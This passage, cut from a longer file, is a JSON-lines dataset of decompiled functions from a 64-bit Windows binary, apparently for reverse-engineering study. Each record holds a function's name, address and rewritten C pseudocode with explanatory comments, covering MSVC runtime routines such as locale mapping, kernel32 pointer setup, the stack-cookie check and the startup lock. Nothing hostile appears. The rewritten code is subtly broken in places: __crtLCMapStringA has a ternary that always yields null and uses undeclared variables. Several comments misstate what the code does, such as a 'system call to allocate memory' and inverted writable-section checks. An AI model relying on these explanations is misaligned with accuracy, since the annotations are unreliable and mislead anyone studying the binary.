(_Ctypevec *)0x0) {\n            // Check the character type using the provided _Ctypevec\n            char_type_flag = (uint)(int)ctype_vector->_Table[(longlong)input_char >> 8 & 0xff] >> 0xf & 1;\n        } else {\n            // Check the character type using the system function\n            char_type_flag = __pctype_func()[input_char >> 8 & 0xff] & 0x8000;\n        }\n    }\n\n    // If the character is not a lowercase letter, set conversion flag to 1\n    if (char_type_flag == 0) {\n        conversion_needed_flag = 1;\n    }\n\n    // Prepare local variables for character conversion\n    char converted_char = (char)input_char; // Store the character to be converted\n    char high_byte = (char_type_flag != 0) ? (char)((uint)input_char >> 8) : 0; // Store high byte if applicable\n\n    // Call the locale-specific string mapping function to convert the character\n    int conversion_result = __crtLCMapStringA(locale_info, (LPCWSTR)0x200, (LPCSTR)(ulonglong)conversion_needed_flag, (int)&converted_char, (LPSTR)0, code_page, 1, 0);\n\n    // If the conversion was successful and not a single character\n    if ((conversion_result != 0) && (input_char = (int)converted_char, conversion_result != 1)) {\n        // Combine the converted character with the high byte if applicable\n        input_char = (int)((converted_char << 8) | high_byte);\n    }\n\n    return input_char; // Return the converted character\n}\n"}
{"Function Name": "FUN_14000a008", "Address": "14000a008", "Source Code": "\n// Function declaration for FUN_14000a008, taking a pointer to a CRITICAL_SECTION as a parameter\nvoid FUN_14000a008(LPCRITICAL_SECTION criticalSectionPointer)\n{\n    // Call the function FUN_14000a5c4 with the CRITICAL_SECTION pointer and a timeout value of 4000\n    FUN_14000a5c4(criticalSectionPointer, 4000);\n}\n"}
{"Function Name": "FUN_14000a028", "Address": "14000a028", "Source Code": "\nundefined8 FUN_14000a028(void)\n{\n    // Get a handle to the kernel32.dll module\n    HMODULE kernel32Module = GetModuleHandleW(L\"kernel32.dll\");\n    \n    // Retrieve the address of the FlsAlloc function and store it in _DAT_140039350 after XORing with DAT_140038080\n    flsAllocAddress = (ulonglong)GetProcAddress(kernel32Module,\"FlsAlloc\") ^ DAT_140038080;\n    // Retrieve the address of the FlsFree function and store it in _DAT_140039358 after XORing with DAT_140038080\n    flsFreeAddress = (ulonglong)GetProcAddress(kernel32Module,\"FlsFree\") ^ DAT_140038080;\n    // Retrieve the address of the FlsGetValue function and store it in _DAT_140039360 after XORing with DAT_140038080\n    flsGetValueAddress = (ulonglong)GetProcAddress(kernel32Module,\"FlsGetValue\") ^ DAT_140038080;\n    // Retrieve the address of the FlsSetValue function and store it in _DAT_140039368 after XORing with DAT_140038080\n    flsSetValueAddress = (ulonglong)GetProcAddress(kernel32Module,\"FlsSetValue\") ^ DAT_140038080;\n    // Retrieve the address of the InitializeCriticalSectionEx function and store it in DAT_140039370 after XORing with DAT_140038080\n    initializeCriticalSectionExAddress = (ulonglong)GetProcAddress(kernel32Module,\"InitializeCriticalSectionEx\") ^ DAT_140038080;\n    // Retrieve the address of the InitOnceExecuteOnce function and store it in DAT_140039378 after XORing with DAT_140038080\n    initOnceExecuteOnceAddress = (ulonglong)GetProcAddress(kernel32Module,\"InitOnceExecuteOnce\") ^ DAT_140038080;\n    // Retrieve the address of the CreateEventExW function and store it in _DAT_140039380 after XORing with DAT_140038080\n    createEventExWAddress = (ulonglong)GetProcAddress(kernel32Module,\"CreateEventExW\") ^ DAT_140038080;\n    // Retrieve the address of the CreateSemaphoreW function and store it in _DAT_140039388 after XORing with DAT_140038080\n    createSemaphoreWAddress = (ulonglong)GetProcAddress(kernel32Module,\"CreateSemaphoreW\") ^ DAT_140038080;\n    // Retrieve the address of the CreateSemaphoreExW function and store it in _DAT_140039390 after XORing with DAT_140038080\n    createSemaphoreExWAddress = (ulonglong)GetProcAddress(kernel32Module,\"CreateSemaphoreExW\") ^ DAT_140038080;\n    // Retrieve the address of the CreateThreadpoolTimer function and store it in _DAT_140039398 after XORing with DAT_140038080\n    createThreadpoolTimerAddress = (ulonglong)GetProcAddress(kernel32Module,\"CreateThreadpoolTimer\") ^ DAT_140038080;\n    // Retrieve the address of the SetThreadpoolTimer function and store it in _DAT_1400393a0 after XORing with DAT_140038080\n    setThreadpoolTimerAddress = (ulonglong)GetProcAddress(kernel32Module,\"SetThreadpoolTimer\") ^ DAT_140038080;\n    // Retrieve the address of the WaitForThreadpoolTimerCallbacks function and store it in _DAT_1400393a8 after XORing with DAT_140038080\n    waitForThreadpoolTimerCallbacksAddress = (ulonglong)GetProcAddress(kernel32Module,\"WaitForThreadpoolTimerCallbacks\") ^ DAT_140038080;\n    // Retrieve the address of the CloseThreadpoolTimer function and store it in _DAT_1400393b0 after XORing with DAT_140038080\n    closeThreadpoolTimerAddress = (ulonglong)GetProcAddress(kernel32Module,\"CloseThreadpoolTimer\") ^ DAT_140038080;\n    // Retrieve the address of the CreateThreadpoolWait function and store it in _DAT_1400393b8 after XORing with DAT_140038080\n    createThreadpoolWaitAddress = (ulonglong)GetProcAddress(kernel32Module,\"CreateThreadpoolWait\") ^ DAT_140038080;\n    // Retrieve the address of the SetThreadpoolWait function and store it in _DAT_1400393c0 after XORing with DAT_140038080\n    setThreadpoolWaitAddress = (ulonglong)GetProcAddress(kernel32Module,\"SetThreadpoolWait\") ^ DAT_140038080;\n    // Retrieve the address of the CloseThreadpoolWait function and store it in _DAT_1400393c8 after XORing with DAT_140038080\n    closeThreadpoolWaitAddress = (ulonglong)GetProcAddress(kernel32Module,\"CloseThreadpoolWait\") ^ DAT_140038080;\n    // Retrieve the address of the FlushProcessWriteBuffers function and store it in _DAT_1400393d0 after XORing with DAT_140038080\n    flushProcessWriteBuffersAddress = (ulonglong)GetProcAddress(kernel32Module,\"FlushProcessWriteBuffers\") ^ DAT_140038080;\n    // Retrieve the address of the FreeLibraryWhenCallbackReturns function and store it in _DAT_1400393d8 after XORing with DAT_140038080\n    freeLibraryWhenCallbackReturnsAddress = (ulonglong)GetProcAddress(kernel32Module,\"FreeLibraryWhenCallbackReturns\") ^ DAT_140038080;\n    // Retrieve the address of the GetCurrentProcessorNumber function and store it in _DAT_1400393e0 after XORing with DAT_140038080\n    getCurrentProcessorNumberAddress = (ulonglong)GetProcAddress(kernel32Module,\"GetCurrentProcessorNumber\") ^ DAT_140038080;\n    // Retrieve the address of the CreateSymbolicLinkW function and store it in _DAT_1400393e8 after XORing with DAT_140038080\n    createSymbolicLinkWAddress = (ulonglong)GetProcAddress(kernel32Module,\"CreateSymbolicLinkW\") ^ DAT_140038080;\n    // Retrieve the address of the GetCurrentPackageId function and store it in _DAT_1400393f0 after XORing with DAT_140038080\n    getCurrentPackageIdAddress = (ulonglong)GetProcAddress(kernel32Module,\"GetCurrentPackageId\") ^ DAT_140038080;\n    // Retrieve the address of the GetTickCount64 function and store it in _DAT_1400393f8 after XORing with DAT_140038080\n    getTickCount64Address = (ulonglong)GetProcAddress(kernel32Module,\"GetTickCount64\") ^ DAT_140038080;\n    // Retrieve the address of the GetFileInformationByHandleEx function and store it in _DAT_140039400 after XORing with DAT_140038080\n    getFileInformationByHandleExAddress = (ulonglong)GetProcAddress(kernel32Module,\"GetFileInformationByHandleEx\") ^ DAT_140038080;\n    // Retrieve the address of the SetFileInformationByHandle function and store it in _DAT_140039408 after XORing with DAT_140038080\n    setFileInformationByHandleAddress = (ulonglong)GetProcAddress(kernel32Module,\"SetFileInformationByHandle\") ^ DAT_140038080;\n    // Retrieve the address of the GetSystemTimePreciseAsFileTime function and store it in _DAT_140039410 after XORing with DAT_140038080\n    getSystemTimePreciseAsFileTimeAddress = (ulonglong)GetProcAddress(kernel32Module,\"GetSystemTimePreciseAsFileTime\") ^ DAT_140038080;\n    // Retrieve the address of the InitializeConditionVariable function and store it in _DAT_140039418 after XORing with DAT_140038080\n    initializeConditionVariableAddress = (ulonglong)GetProcAddress(kernel32Module,\"InitializeConditionVariable\") ^ DAT_140038080;\n    // Retrieve the address of the WakeConditionVariable function and store it in _DAT_140039420 after XORing with DAT_140038080\n    wakeConditionVariableAddress = (ulonglong)GetProcAddress(kernel32Module,\"WakeConditionVariable\") ^ DAT_140038080;\n    // Retrieve the address of the WakeAllConditionVariable function and store it in _DAT_140039428 after XORing with DAT_140038080\n    wakeAllConditionVariableAddress = (ulonglong)GetProcAddress(kernel32Module,\"WakeAllConditionVariable\") ^ DAT_140038080;\n    // Retrieve the address of the SleepConditionVariableCS function and store it in _DAT_140039430 after XORing with DAT_140038080\n    sleepConditionVariableCSAddress = (ulonglong)GetProcAddress(kernel32Module,\"SleepConditionVariableCS\") ^ DAT_140038080;\n    // Retrieve the address of the InitializeSRWLock function and store it in _DAT_140039438 after XORing with DAT_140038080\n    initializeSRWLockAddress = (ulonglong)GetProcAddress(kernel32Module,\"InitializeSRWLock\") ^ DAT_140038080;\n    // Retrieve the address of the AcquireSRWLockExclusive function and store it in _DAT_140039440 after XORing with DAT_140038080\n    acquireSRWLockExclusiveAddress = (ulonglong)GetProcAddress(kernel32Module,\"AcquireSRWLockExclusive\") ^ DAT_140038080;\n    // Retrieve the address of the TryAcquireSRWLockExclusive function and store it in _DAT_140039448 after XORing with DAT_140038080\n    tryAcquireSRWLockExclusiveAddress = (ulonglong)GetProcAddress(kernel32Module,\"TryAcquireSRWLockExclusive\") ^ DAT_140038080;\n    // Retrieve the address of the ReleaseSRWLockExclusive function and store it in _DAT_140039450 after XORing with DAT_140038080\n    releaseSRWLockExclusiveAddress = (ulonglong)GetProcAddress(kernel32Module,\"ReleaseSRWLockExclusive\") ^ DAT_140038080;\n    // Retrieve the address of the SleepConditionVariableSRW function and store it in _DAT_140039458 after XORing with DAT_140038080\n    sleepConditionVariableSRWAddress = (ulonglong)GetProcAddress(kernel32Module,\"SleepConditionVariableSRW\") ^ DAT_140038080;\n    // Retrieve the address of the CreateThreadpoolWork function and store it in _DAT_140039460 after XORing with DAT_140038080\n    createThreadpoolWorkAddress = (ulonglong)GetProcAddress(kernel32Module,\"CreateThreadpoolWork\") ^ DAT_140038080;\n    // Retrieve the address of the SubmitThreadpoolWork function and store it in _DAT_140039468 after XORing with DAT_140038080\n    submitThreadpoolWorkAddress = (ulonglong)GetProcAddress(kernel32Module,\"SubmitThreadpoolWork\") ^ DAT_140038080;\n    // Retrieve the address of the CloseThreadpoolWork function and store it in _DAT_140039470 after XORing with DAT_140038080\n    closeThreadpoolWorkAddress = (ulonglong)GetProcAddress(kernel32Module,\"CloseThreadpoolWork\") ^ DAT_140038080;\n    // Retrieve the address of the CompareStringEx function and store it in _DAT_140039478 after XORing with DAT_140038080\n    compareStringExAddress = (ulonglong)GetProcAddress(kernel32Module,\"CompareStringEx\") ^ DAT_140038080;\n    // Retrieve the address of the GetLocaleInfoEx function and store it in _DAT_140039480 after XORing with DAT_140038080\n    getLocaleInfoExAddress = (ulonglong)GetProcAddress(kernel32Module,\"GetLocaleInfoEx\") ^ DAT_140038080;\n    // Retrieve the address of the LCMapStringEx function and store it in DAT_140039488 after XORing with DAT_140038080\n    lcMapStringExAddress = (ulonglong)GetProcAddress(kernel32Module,\"LCMapStringEx\") ^ DAT_140038080;\n    \n    // Return 0 indicating successful completion\n    return 0;\n}\n"}
{"Function Name": "__crtInitOnceExecuteOnce", "Address": "14000a4f8", "Source Code": "\nulonglong __crtInitOnceExecuteOnce\n(longlong *param_1, undefined *param_2, undefined8 param_3, undefined8 param_4)\n{\n    int iVar1; // Variable to store the result of the guard dispatch call\n    ulonglong uVar2; // Variable to hold the return value\n    longlong lVar3; // Variable to hold the current state of param_1\n    longlong lVar4; // Variable to hold the new state to set for param_1\n\n    // Check if the initialization state is equal to the expected state\n    if (DAT_140039378 == DAT_140038080) {\n        uVar2 = 1; // Set return value to 1 initially\n        LOCK(); // Acquire lock to ensure thread safety\n        lVar3 = *param_1; // Read the current state of param_1\n        if (lVar3 == 0) { // If the state is uninitialized\n            *param_1 = 1; // Set the state to initializing\n            lVar3 = 0; // Update lVar3 to reflect the new state\n        }\n        UNLOCK(); // Release the lock\n        lVar4 = 2; // Set the new state to initialized\n\n        // Loop until the state of param_1 is set to initialized\n        while (lVar3 != 2) {\n            if (lVar3 == 0) { // If the state is uninitialized\n                // Call the guard dispatch function and store the result\n                iVar1 = (*(code *)PTR__guard_dispatch_icall_1400213e8)(param_1, param_3, param_4);\n                if (iVar1 == 0) { // If the dispatch call failed\n                    lVar4 = 0; // Set the new state to failure\n                }\n                LOCK(); // Acquire lock to update the state\n                lVar3 = *param_1; // Read the current state again\n                *param_1 = lVar4; // Update the state to the new value\n                UNLOCK(); // Release the lock\n                if (lVar3 == 1) { // If the previous state was initializing\n                    return (ulonglong)(iVar1 != 0); // Return success or failure based on iVar1\n                }\n                SetLastError(0xd); // Set an error code for failure\n                return 0; // Return 0 indicating failure\n            }\n            if (lVar3 != 1) { // If the state is neither uninitialized nor initializing\n                SetLastError(0xd); // Set an error code for failure\n                return 0; // Return 0 indicating failure\n            }\n            SwitchToThread(); // Yield execution to allow other threads to run\n            LOCK(); // Acquire lock to check and update the state\n            lVar3 = *param_1; // Read the current state again\n            if (lVar3 == 0) { // If the state is uninitialized\n                *param_1 = 1; // Set the state to initializing\n                lVar3 = 0; // Update lVar3 to reflect the new state\n            }\n            UNLOCK(); // Release the lock\n        }\n    } else {\n        // If the initialization state is not as expected, call the guard dispatch function\n        uVar2 = (*(code *)PTR__guard_dispatch_icall_1400213e8)();\n    }\n    return uVar2; // Return the final value\n}\n"}
{"Function Name": "FUN_14000a5c4", "Address": "14000a5c4", "Source Code": "\nundefined8 FUN_14000a5c4(LPCRITICAL_SECTION critical_section,DWORD spin_count)\n{\n    // Check if the global variable DAT_140039370 is not equal to DAT_140038080\n    if (global_var_1 != global_var_2) {\n        // Call the guard dispatch function if the condition is true\n        return (*(code *)guard_dispatch_function)();\n    }\n    // Initialize the critical section and set the spin count\n    InitializeCriticalSectionAndSpinCount(critical_section, spin_count);\n    // Return success indicator\n    return 1;\n}\n"}
{"Function Name": "FUN_14000a5f4", "Address": "14000a5f4", "Source Code": "\n// Function declaration for FUN_14000a5f4, returning a pointer to an undefined type\nundefined * getUndefinedPointer(void)\n{\n    // Return the value of the global variable DAT_140039490\n    return globalUndefinedPointer;\n}\n"}
{"Function Name": "_Atexit", "Address": "14000a5fc", "Source Code": "\nvoid __cdecl _Atexit(_func_void *function_pointer)\n{\n    // Check if the global variable DAT_140038068 is not zero\n    if (global_counter != 0) {\n        // Store the encoded pointer of param_1 in the array at the calculated index\n        *(PVOID *)(&pointer_array + (--global_counter * 8)) = EncodePointer(function_pointer);\n        return; // Exit the function after storing the pointer\n    }\n    // If DAT_140038068 is zero, terminate the program\n    abort();\n}\n"}
{"Function Name": "__crtLCMapStringA", "Address": "14000a638", "Source Code": "\nint __cdecl\n__crtLCMapStringA(_locale_t _Plocinfo, LPCWSTR _LocaleName, DWORD _DwMapFlag, LPCSTR _LpSrcStr,\nint _CchSrc, LPSTR _LpDestStr, int _CchDest, int _Code_page, BOOL _BError)\n{\n    int iVar2, iVar3, iVar4; // Variable declarations for intermediate results\n    size_t sVar5; // Variable to hold string length\n    ulonglong uVar6, uVar7; // Variables for calculations\n    LPCWSTR lpSrcStr; // Pointer for source wide string\n    DWORD dwMapFlags = (DWORD)_LocaleName; // Cast locale name to DWORD for mapping flags\n    char *_String = (char *)CONCAT44(in_register_00000084, _DwMapFlag); // Concatenate flags\n    iVar3 = (int)_LpSrcStr; // Cast source string pointer to integer\n\n    if (0 < iVar3) { // Check if source string length is greater than 0\n        sVar5 = __strncnt(_String, (longlong)iVar3); // Count characters in the source string\n        iVar4 = (int)sVar5 + 1; // Set destination length to source length + 1\n        if (iVar3 <= sVar5) { // If source length is less than or equal to counted length\n            iVar4 = sVar5; // Set destination length to counted length\n        }\n    }\n\n    iVar3 = MultiByteToWideChar(_CchDest, (-(uint)(_Code_page != 0) & 8) + 1, _String, iVar4, (LPWSTR)0x0, 0); // Convert multi-byte to wide char\n    if (iVar3 == 0) goto LAB_14000a8c3; // If conversion fails, jump to cleanup\n\n    uVar7 = (longlong)iVar3 * 2 + 0x10; // Calculate size for wide char string\n    uVar7 = -(ulonglong)((ulonglong)((longlong)iVar3 * 2) < uVar7) & uVar7; // Adjust size if necessary\n    lpSrcStr = (uVar7 == 0) ? (LPCWSTR)0x0 : (LPCWSTR)0x0; // Initialize source string pointer\n\n    if (lpSrcStr != (LPCWSTR)0x0) { // If source string pointer is valid\n        *(int *)(puVar10 + 0x28) = iVar3; // Store the length of the wide char string\n        *(LPCWSTR *)(puVar10 + 0x20) = lpSrcStr; // Store the pointer to the wide char string\n        iVar4 = MultiByteToWideChar(_CchDest, 1, _String, iVar4, *(LPWSTR *)(puVar10 + 0x20), *(int *)(puVar10 + 0x28)); // Convert again\n        if (iVar4 != 0) { // If conversion is successful\n            *(undefined4 *)(puVar10 + 0x28) = 0; // Reset length\n            *(undefined8 *)(puVar10 + 0x20) = 0; // Reset pointer\n            iVar4 = __crtLCMapStringEx((LPCWSTR)_Plocinfo, dwMapFlags, lpSrcStr, iVar3, *(LPWSTR *)(puVar10 + 0x20), *(int *)(puVar10 + 0x28)); // Call mapping function\n            if (iVar4 != 0) { // If mapping is successful\n                if (((ulonglong)_LocaleName & 0x400) == 0) { // Check if locale name has specific flag\n                    uVar7 = (longlong)iVar4 * 2 + 0x10; // Calculate size for wide char string\n                    uVar7 = -(ulonglong)((ulonglong)((longlong)iVar4 * 2) < uVar7) & uVar7; // Adjust size if necessary\n                    if (uVar7 < 0x401) { // If size is less than a threshold\n                        uVar6 = uVar7 + 0xf; // Adjust size for alignment\n                        if (uVar6 <= uVar7) { // Ensure size is valid\n                            uVar6 = 0xffffffffffffff0; // Set to a default value if invalid\n                        }\n                        lpWideCharStr = (LPCWSTR)(puVar10 + (-(uVar6 & 0xfffffffffffffff0))); // Allocate space for wide char string\n                        if (lpWideCharStr == (LPCWSTR)0x0) goto LAB_14000a8ab; // Check for allocation failure\n                        lpWideCharStr[0] = L''; // Initialize first character\n                        lpWideCharStr[1] = L'\\0'; // Null-terminate the string\n                    } else {\n                        lpWideCharStr = (LPCWSTR)_malloc_base(uVar7); // Allocate memory for wide char string\n                        if (lpWideCharStr == (LPCWSTR)0x0) goto LAB_14000a82d; // Check for allocation failure\n                        lpWideCharStr[0] = L'\\xdddd'; // Initialize first character\n                        lpWideCharStr[1] = L'\\0'; // Null-terminate the string\n                    }\n                    lpWideCharStr += 8; // Adjust pointer for further use\n                }\n                LAB_14000a82d:\n                if (lpWideCharStr != (LPCWSTR)0x0) { // If wide char string pointer is valid\n                    *(int *)(puVar10 + 0x28) = iVar4; // Store the length of the mapped string\n                    *(LPCWSTR *)(puVar10 + 0x20) = lpWideCharStr; // Store the pointer to the mapped string\n                    iVar3 = __crtLCMapStringEx((LPCWSTR)_Plocinfo, dwMapFlags, lpSrcStr, iVar3, *(LPWSTR *)(puVar10 + 0x20), *(int *)(puVar10 + 0x28)); // Call mapping function again\n                    if (iVar3 == 0) { // If mapping fails\n                        goto LAB_14000a891; // Jump to cleanup\n                    }\n                    if (*(int *)(lpWideCharStr + -8) == 0xdddd) { // Check for specific initialization\n                        FUN_14000ead0(lpWideCharStr + -8); // Free allocated memory\n                    }\n                }\n            }\n        }\n    } else if ((int)_LpDestStr != 0 && iVar4 <= (int)_LpDestStr) { // If destination string is valid and has enough space\n        *(int *)(puVar10 + 0x28) = (int)_LpDestStr; // Store the length of the destination string\n        *(ulonglong *)(puVar10 + 0x20) = CONCAT44(in_stack_0000002c, _CchSrc); // Prepare for mapping\n        __crtLCMapStringEx((LPCWSTR)_Plocinfo, dwMapFlags, lpSrcStr, iVar3, *(LPWSTR *)(puVar10 + 0x20), *(int *)(puVar10 + 0x28)); // Call mapping function\n    }\n\nLAB_14000a8c3:\n    uVar7 = local_28[0] ^ (ulonglong)local_28; // Security check\n    __security_check_cookie(uVar7); // Perform security check\n    return extraout_EAX; // Return result\n}\n"}
{"Function Name": "GetTableIndexFromLocaleName", "Address": "14000a8ec", "Source Code": "\nundefined4 GetTableIndexFromLocaleName(longlong locale_name)\n{\n    int midpoint_index; // Variable to hold the midpoint index for binary search\n    int upper_bound = 0xe3; // Upper bound of the search range\n    int lower_bound = 0; // Lower bound of the search range\n\n    do {\n        midpoint_index = (upper_bound + lower_bound) / 2; // Calculate the midpoint index\n        int comparison_result = __wcsnicmp_ascii(locale_name, (ushort *)(&PTR_DAT_140023830)[(longlong)midpoint_index * 2], 0x55); // Compare locale name with the entry at midpoint\n\n        if (comparison_result == 0) { // If a match is found\n            return *(undefined4 *)(&DAT_140023838 + (longlong)midpoint_index * 0x10); // Return the corresponding index\n        }\n\n        if (comparison_result < 0) { // If the locale name is less than the entry at midpoint\n            upper_bound = midpoint_index - 1; // Adjust the upper bound to search the lower half\n        } else { // If the locale name is greater than the entry at midpoint\n            lower_bound = midpoint_index + 1; // Adjust the lower bound to search the upper half\n        }\n    } while (lower_bound <= upper_bound); // Continue searching while the bounds are valid\n\n    return 0xffffffff; // Return an error value if no match is found\n}\n"}
{"Function Name": "__crtDownlevelLocaleNameToLCID", "Address": "14000a97c", "Source Code": "\nundefined4 __crtDownlevelLocaleNameToLCID(longlong locale_name)\n{\n    uint table_index; // Declare a variable to hold the table index\n\n    // Check if param_1 is not zero and get the table index from the locale name\n    if (locale_name != 0 && (table_index = GetTableIndexFromLocaleName(locale_name), table_index < 0xe4)) {\n        // Return the corresponding value from the data table based on the index\n        return *(undefined4 *)(&DAT_1400229f0 + (longlong)(int)table_index * 0x10);\n    }\n    \n    // Return 0 if param_1 is zero or the index is out of bounds\n    return 0;\n}\n"}
{"Function Name": "__crtLCMapStringEx", "Address": "14000a9b0", "Source Code": "\nint __cdecl\n__crtLCMapStringEx(LPCWSTR lpLocaleName, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc,\n                   LPWSTR lpDestStr, int cchDest)\n{\n    LCID Locale; // Declare a variable to hold the locale identifier\n\n    // Check if a specific condition related to DAT_140039488 and DAT_140038080 is met\n    if (DAT_140039488 == DAT_140038080) {\n        // Convert the locale name to a locale identifier (LCID)\n        Locale = __crtDownlevelLocaleNameToLCID((longlong)lpLocaleName);\n        // Call LCMapStringW function with the obtained LCID and other parameters\n        return LCMapStringW(Locale, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest);\n    } else {\n        // Call a function pointer for a different implementation when the condition is not met\n        return (*(code *)PTR__guard_dispatch_icall_1400213e8)\n            (lpLocaleName, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest, 0, 0, 0);\n    }\n}\n"}
{"Function Name": "__security_check_cookie", "Address": "14000aad0", "Source Code": "\nvoid __cdecl __security_check_cookie(uintptr_t stack_cookie)\n{\n    // Check if the provided stack cookie matches the expected value\n    // and if the upper 16 bits of the cookie are zero\n    if (stack_cookie == expected_cookie && (short)(stack_cookie >> 0x30) == 0) {\n        // If both conditions are met, exit the function without any action\n        return;\n    }\n    // If the checks fail, report a stack corruption failure\n    __report_gsfailure(stack_cookie);\n}\n"}
{"Function Name": "thunk_FUN_14000b460", "Address": "14000aaf4", "Source Code": "\nvoid releaseResourcesFunction(void) // Function definition for thunk_FUN_14000b460\n{\n    freeResources(NULL); // Call _free_base function with NULL argument to free resources\n}\n"}
{"Function Name": "operator_new", "Address": "14000aafc", "Source Code": "\nvoid * __cdecl operator_new(__uint64 size) // Function to allocate memory\n{\n    LPVOID allocated_memory; // Pointer to hold the allocated memory\n    do {\n        allocated_memory = malloc(size); // Attempt to allocate memory of size param_1\n        if (allocated_memory != (LPVOID)0x0) { // Check if allocation was successful\n            return allocated_memory; // Return the allocated memory pointer\n        }\n    } while (custom_new_handler(size) != 0); // Call custom new handler if allocation failed\n\n    error_handler(); // Call a function (possibly for error handling or logging)\n    return (void *)(*(code *)system_call(3))(); // Invoke a system call to allocate memory and return the pointer\n}\n"}
{"Function Name": "__scrt_acquire_startup_lock", "Address": "14000ab38", "Source Code": "\nulonglong __scrt_acquire_startup_lock(void) // Function to acquire a startup lock\n{\n    ulonglong returnValue; // Variable to hold the return value\n    bool isUcrtDllInUse; // Boolean variable to check if UCRT DLL is in use\n\n    isUcrtDllInUse = __scrt_is_ucrt_dll_in_use(); // Check if UCRT DLL is in use\n    returnValue = isUcrtDllInUse ? 1 : 0; // Set uVar3 to 1 if UCRT DLL is in use, otherwise 0\n\n    if (!isUcrtDllInUse) { // If UCRT DLL is not in use\n        returnValue = returnValue & 0xffffffffffffff00; // Clear the lower 8 bits of uVar3\n    } else {\n        do {\n            LOCK(); // Acquire the lock\n            isUcrtDllInUse = DAT_140039658 == 0; // Check if the lock is available\n            if (!isUcrtDllInUse) {\n                returnValue = DAT_140039658; // If not available, set uVar3 to the current lock value\n            }\n            DAT_140039658 = *(ulonglong *)((longlong)Self + 8); // Update the lock value\n            UNLOCK(); // Release the lock\n        } while (*(ulonglong *)((longlong)Self + 8) != returnValue); // Repeat until the lock value is unchanged\n    }\n    return returnValue; // Return the acquired lock value\n}\n"}
{"Function Name": "__scrt_initialize_crt", "Address": "14000ab74", "Source Code": "\nulonglong __scrt_initialize_crt(int input_param) // Function to initialize the CRT\n{\n    if (input_param == 0) { // Check if the input parameter is zero\n        global_var = 1; // Set a global variable to 1\n    }\n    __isa_available_init(); // Initialize ISA availability\n    ulonglong init_result = vcrt_init(); // Call VCRT initialization and store the result\n    if ((char)init_result != '\\0') { // Check if the initialization was successful\n        if ((char)check_function() != '\\0') { // Call another function and check its result\n            return concat_result((int7)((ulonglong)check_function() >> 8), 1); // Return a concatenated value if successful\n        }\n        init_result = vcrt_uninit('\\0'); // Uninitialize VCRT if the previous check failed\n    }\n    return init_result & 0xffffffffffffff00; // Return the result masked to 0xFFFFFF00\n}\n"}
{"Function Name": "FUN_14000abc0", "Address": "14000abc0", "Source Code": "\nundefined8 FUN_14000abc0(uint input_param)\n{\n    code *function_pointer; // Pointer to a function (code)\n    ulonglong result_value; // Variable to hold a 64-bit value\n\n    // Check if the global variable DAT_140039661 is not set\n    if (is_initialized == '\\0') {\n        // If param_1 is greater than 1, trigger a fast fail\n        if (1 < input_param) {\n            __scrt_fastfail(5); // Trigger a fast fail with error code 5\n            function_pointer = (code *)swi(3); // Call a system interrupt\n            return (*function_pointer)(); // Execute the function pointed by pcVar1\n        }\n        // If the UCRT DLL is not in use and param_1 is 0\n        if (!__scrt_is_ucrt_dll_in_use() && input_param == 0) {\n            // Calculate a value based on DAT_140038080 and store it in bVar2\n            byte bit_mask = 0x40 - ((byte)base_value & 0x3f) & 0x3f;\n            // Generate a mask and XOR it with DAT_140038080\n            result_value = (0xffffffffffffffffU >> bit_mask | -1L << 0x40 - bit_mask) ^ base_value;\n            // Initialize multiple global variables with the calculated in_RAX value\n            global_var_1 = result_value;\n            global_var_2 = result_value;\n            global_var_3 = result_value;\n            global_var_4 = result_value;\n            global_var_5 = result_value;\n            global_var_6 = result_value;\n        } else {\n            // Initialize the on-exit table and check for errors\n            result_value = initialize_exit_table((longlong *)&DAT_140039668);\n            // If initialization fails, try to initialize another table\n            if ((int)result_value != 0 || (result_value = initialize_exit_table((longlong *)&DAT_140039680), (int)result_value != 0)) {\n                return result_value & 0xffffffffffffff00; // Return error code if initialization fails\n            }\n        }\n        // Set the global variable DAT_140039661 to indicate initialization is complete\n        is_initialized = '\\x01';\n    }\n    // Return a concatenated value of in_RAX and 1\n    return concatenate_result((int7)(result_value >> 8), 1);\n}\n"}
{"Function Name": "__scrt_is_nonwritable_in_current_image", "Address": "14000ac70", "Source Code": "\nulonglong __scrt_is_nonwritable_in_current_image(longlong addressToCheck)\n{\n    ulonglong dosMagicNumber = 0x5a4d; // Initialize uVar1 with the DOS magic number\n    longlong peHeaderOffset; // Variable to hold the offset to the PE header\n    longlong sectionIterator; // Variable for iterating through sections\n\n    // Check if the image is a valid DOS executable and has a PE header\n    if (((IMAGE_DOS_HEADER_140000000.e_magic == (char [2])0x5a4d) && // Check DOS magic number\n        (peHeaderOffset = (longlong)(int)IMAGE_DOS_HEADER_140000000.e_lfanew, // Get the offset to the PE header\n        *(int *)(IMAGE_DOS_HEADER_140000000.e_magic + peHeaderOffset) == 0x4550)) && // Check PE magic number\n        (*(short *)((longlong)IMAGE_DOS_HEADER_140000000.e_res_4_ + peHeaderOffset + -4) == 0x20b)) { // Check for a specific characteristic\n\n        // Calculate the section header table's starting address\n        sectionIterator = peHeaderOffset + 0x140000018 + (ulonglong)*(ushort *)((longlong)IMAGE_DOS_HEADER_140000000.e_res_4_ + peHeaderOffset + -8);\n        dosMagicNumber = (ulonglong)*(ushort *)(IMAGE_DOS_HEADER_140000000.e_magic + peHeaderOffset + 6); // Get the number of sections\n        peHeaderOffset = sectionIterator + dosMagicNumber * 0x28; // Calculate the end address of the section headers\n\n        // Iterate through each section header\n        for (; sectionIterator != peHeaderOffset; sectionIterator += 0x28) {\n            // Check if the address falls within the writable section\n            if (((ulonglong)*(uint *)(sectionIterator + 0xc) <= addressToCheck - 0x140000000U) && // Check section's virtual address\n                (addressToCheck - 0x140000000U < (ulonglong)(*(int *)(sectionIterator + 8) + *(uint *)(sectionIterator + 0xc)))) { // Check if within section size\n                goto LAB_14000ace6; // Jump to the label if writable\n            }\n        }\n        sectionIterator = 0; // Set lVar4 to 0 if no writable section found\n    LAB_14000ace6:\n        // Determine the writable status based on lVar4\n        if (sectionIterator == 0) {\n            dosMagicNumber &= 0xffffffffffffff00; // Clear the writable flag\n        } else {\n            if (*(int *)(sectionIterator + 0x24) < 0) { // Check if the section is writable\n                dosMagicNumber = (dosMagicNumber >> 8) << 8; // Clear the writable flag\n            } else {\n                dosMagicNumber = (dosMagicNumber & 0xffffffffffffff00) | 1; // Set the writable flag\n            }\n        }\n    } else {\n        dosMagicNumber &= 0xffffffffffffff00; // Clear the writable flag if not a valid image\n    }\n    return dosMagicNumber; // Return the writable status\n}\n"}
